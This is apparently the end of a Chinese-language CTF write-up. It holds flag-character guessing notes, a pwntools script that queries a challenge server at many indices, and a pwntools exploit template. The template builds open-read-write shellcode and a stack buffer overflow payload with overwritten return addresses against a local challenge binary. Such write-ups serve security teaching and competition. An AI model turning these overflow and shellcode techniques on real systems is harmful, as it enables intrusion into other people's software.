'4kd', '5X5', 'HU', 'Pp5', 'Hk5', 'sU5', 'PX5', 'Gp5', 'ztd', '6k5', 'hS', 'K0H', 'bI5', 'ZkH', 'IX5'}
# 42: {'H5Y', '1d_', 's5Q', 'nd', 'ed', 'U5', 'r5', 'SHY', 'Hj', 'zH', 'Sj', '1HG', 'td', 'P5', 'p5', 'wd', 'PjQ', '15', 'sH', '1jY', 'kj', 'wj_', 'sjG', 's5', '05Q', 'kd_', 'ZdG', 'kH_', 'XdQ', 'H5_', 'nd_', 'Xd', 'I5G', 'n5G', 'tHG', 'Zd', 'I5', 'sHY', '1d', '0j', 'YdQ', 'Y5', 'Ud', '0jQ', 'IHG', 'Z5Y'}
# 43: {'jGh', 'd_b', '5', 'd', 'dQh', '5Qb', 'jYh', 'H', 'j', 'd_'}
# 44: {'_b3', 'G', 'Q', '_b', 'Gb3', 'Y', '_', 'Yh3', '_h'}
# 45: {'h3_', 'b3_'}
flag_chars[44] = '_' # 42-44的條件中44都有可能是底線，試試
## c0..._b3 -> co..._be
# 41: {'9YH', 'iUd', 'D0', 'xwd', 'HU5', 'IZd', 'j1H', 'jsj', 'op5', 'usj', 'yHj', 'J15', 'Nr5', '5nj', '9Id', 'hS', '5X5', 'hrj', 'Ird', 'xrd', 'xk', 'P1H', 'brj', 'bp5', 'kt', 'Ekd', '7td', 'htd', 'ewH', 'etj', 'D1H', '1P', 'bk5', 'qrj', 'K0H', 'JUH', 'es5', '_sj', 'IX5', 'Tkd', '8UH', '6H5', 'lPd', 'EHj', 'ZkH', 'JpH', 'Qwd', 'swd', 'EZ5', 'Gp5', 'Qej', 'oXj', 'sSj', 'vHj', 'DPH', 'xH', 'sU5', 'uZj', '615', 'hI', '1sH', 'qZH', '4X', 'QeH', '5XH', '5ZH', 'PX5', 'Q15', 'BHH', 'QXd', 'HU', 'KS', 'orj', 'LsH', 'Npj', 'xPH', '7YH', 'twH', 'PwH', 'kPj', 'hnd', 'hzd', 'Wp5', 'vrd', 'XU', 'Xs', 't1', 'QSj', 'LkH', '4p5', '8e5', '4sH', 'kz5', 'ezH', 'i0', 'Hk5', 'VzH', 'HHd', 'IY', 'Lt5', 'Tsj', 'WY5', 'BUj', '8ZH', 'H0', 'Lw', 'bI5', '1S', 'ZZj', 'zId', 'x1H', 'qY5', 'IUd', 'HtH', '4Id', 'yzd', 'KHH', 'ePj', '_0', '6r5', '4HH', 'GId', 'qwj', 'LI5', 'aUd', 'Zrj', 'mej', 'Gej', 'ePH', 'BYj', 'EsH', 'ZHH', 'hnH', 'eH5', 'vY', 'v1d', 'ie5', '_r5', 'kHH', 'ZX5', 'Btd', 'ke', 'sId', 'tX', 'Ez5', 'lH5', 'hZ5', 'Zw', 'qeH', 'Znd', 'mzH', 'EkH', '6k5', 'vXd', 'KZj', '_rj', 'mZ', 'u1d', 'JnH', 'Pe', 'Qrj', 'Dwj', '6Zd', 'tIj', '8s', 'xtH', 'aH5', 'btj', 'Gs', 'QP', 'yrj', 'T0j', '7wH', '_p', 'Hw', 'VI', 'Qrd', 'Csd', 'eI', 'Pp5', 'KYd', 'Qzj', 'NwH', 'eX5', 'sz', 'DeH', 'mr5', 'Twj', 'NeH', '7H5', 'yI', 'tXd', 'h1j', 'vH5', 'ztd', '5Ud', 'TS5', 'Bsj', 'Ls', 'JZ5', 'hZj', 'EH', '6nj', 'ur5', 'PIH', 'QHH', 'Lk', 'QU', 'PpH', 'u1', 'Wp', '6pd', 'Jw5', 'yZj', 'sYd', '8Y', 'G05', 't0', 'Tn', '5YH', 'xId', 'qwd', 'Vrd', 'jPj', 'L0j', 'Ktj', '4s5', 'et', 'otj', 'VZ5', 'ys5', 'BI5', '_k5', 'HY', '4U', 'xHd', 'sHH', 't1j', 'u1j', 'ktd', 'hej', '9e5', 'KUd', '_05', 'GI5', '6e', 'utH', 'uIH', 'Pe5', '1SH', 'IXj', 'jej', '1Uj', '4kd', 'bP', 'ktH', '_ZH', 'xS5', 'skj', 'Xrj', 'Wkj', 'HI', 'b1j', 'jId', 'JS', 'vY5', 'ZY', 'qXd', 'Gwd', '5Hj', 'Zk', 'Vnd', 'ezj', 'jH', 'qr', 'Zwd', 'ytH', '7ed', 'mkd', 'tSH', 'Wnd'}
# 42: {'Zd', 'zH', 'nd', 'td', '15', '1d', 'H5_', 'kj', 's5', 'Ud', 'p5', 'kH_', 'sH', 'kd_', 'Hj', '1d_', 'P5', 'U5', 'I5', 'Y5', 'Sj', '0j', 'r5', 'ed', 'wd', 'Xd', 'wj_', 'nd_'}
# 43: {'d', 'd_', 'd_b', '5', 'H', 'j'}
# seemingly_begign(??? begin?)_bash_scripts_co..._be_dangerous_when_they_are_self_modifying
# could be?
flag_chars[41] = 'u'
```



```
from pwn import *

# context.log_level = "debug" # 最小化日誌記錄
i = 0
while(i < 0x100):
    i += 1
    try:
        r = remote("c55-flag-hasher.hkcert24.pwnable.hk", 1337, ssl=True)
        r.recvuntil(b"2 - Read Hash recordn") # 等待直到我們收到這個文本... 這是我們需要回應的時候
        r.sendline(b'2')                       # 發送命令
        r.recvuntil(b"Idx: ")
        idx = i
        print(idx)
        r.sendline(str(idx).encode())          # 將 `idx`的值轉換為字符串，並發送它
        server_response = r.recvline()         # 將服務器的回應保存到變量裡
        print(server_response)
        hex_ouput = server_response.split(b" : ")[1] # 從服務器響應中獲取十六進制部分
        print(hex_ouput)
    except:
        pass
    finally:
        r.close()
```



```
from pwn import *
#from Crypto.Util.number import bytes_to_long,bytes_to_long
from ae64 import AE64
import sys
#--------------------setting context---------------------
context.clear(arch='amd64', os='linux', log_level='debug')
li = lambda content,data : print('x1b[01;38;5;214m' + content + ' = ' + hex(data) + 'x1b[0m')
lg = lambda content : print('x1b[01;38;5;214m' + content +'x1b[0m')
sla = lambda data, content: io.sendlineafter(data,content)
sa = lambda data, content: io.sendafter(data,content)
sl = lambda data: io.sendline(data)
rl = lambda data: io.recvuntil(data)
re = lambda data: io.recv(data)
sa = lambda data, content: io.sendafter(data,content)
dbg = lambda    : gdb.attach(io)
bk = lambda : (dbg(),pause())
inter = lambda: io.interactive()
l64 = lambda    :u64(io.recvuntil(b'x7f')[-6:].ljust(8,b'x00'))
h64=lambda     :u64(io.recv(6).ljust(8,b'x00'))
add=0
orw_shellcode = asm(shellcraft.open('flag') + shellcraft.read(3, add, 0x30) + shellcraft.write(1,add, 0x30))
def dbg(c = 0):
    if(c):
        gdb.attach(io, c)
        #pause()
    else:
        gdb.attach(io)
        pause()

#---------------------------------------------------------
filename = "./chal"
io = process(filename)
#io = remote("39.106.48.123",34015)
elf = ELF(filename)
#libc=ELF("./libc-2.31-0kylin9.2k0.2.so")
#初始化完成---------------------------------------------------------
payload=b'EXIT'
payload+=payload.ljust(256+4,b'a')
payload+=p64(0x4011FB)*2
dbg()
sla(b":",payload)
inter()
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/12/5-1735548683.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/12/5-1735548685.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/12/8-1735548686.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/12/5-1735548688.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/12/4-1735548689.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/12/6-1735548689.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/12/9-1735548690.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/12/6-1735548691.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/12/4-1735548693.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/12/3-1735548694.png)